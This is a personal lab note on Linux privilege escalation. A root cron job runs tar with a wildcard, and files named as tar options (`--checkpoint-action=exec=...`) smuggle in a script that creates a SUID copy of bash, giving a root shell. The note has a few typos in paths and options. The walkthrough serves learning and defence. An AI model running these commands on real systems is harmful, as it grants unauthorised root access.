This type of escalation leverages on the wildcards of cron ( `*` ) are used in the wrong way or when an attacker has access to the configuration file of `cron`.



<mark style="background: #BBFABBA6;">In this case we can see that there is a cron with a specific path:</mark>
```bash
cat /etc/crontab
```
- ![[Pasted image 20250117160921.png]]

So let's look at it in order to understand what it does:
```bash
cat /usr/local/bin/compress.sh
```
- ![[Pasted image 20250117161017.png]]


So it creates a `backup` compressed file with the content of `/home/user`.

We can see in it that it uses a wildcard `*`:
- ![[Pasted image 20250117161206.png]]

==**So we can inject this**== `*` **==wildcard.==**


Using:
```bash
ls -la /ust/local/bin/compress.sh
```
- ![[Pasted image 20250117161305.png]]
- we can see that we have only read access to this script and we cannot modify it


# Creating a malicious script to run
So we can create a malicious script:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > runme.sh
```

We make it executable:
```bash
chmod +x runme.sh
```

Since we can make an injection what we can do here is to create checkpoints with:
```bash
touch /home/user/--checkpoint=1

touch /home/user/--checkpoint-action=exec=sh\runme.sh
```


This because the `*` will be read as `---checkpoint=1`
And when this checkpoint is triggered we execute `sh\runme.sh`


At this point the system creates a `/tmp/bash` that gives us the root shell:
```bash
/tmp/bash
```
- ![[Pasted image 20250117162024.png]]

This works because the `tar` command sees the `*` as `--checkpoint`. Since we set the checkpoint in the folder in which is executed the command it will trigger the execution of the checkpoint script.

<mark style="background: #BBFABBA6;">We gain a root shell!</mark>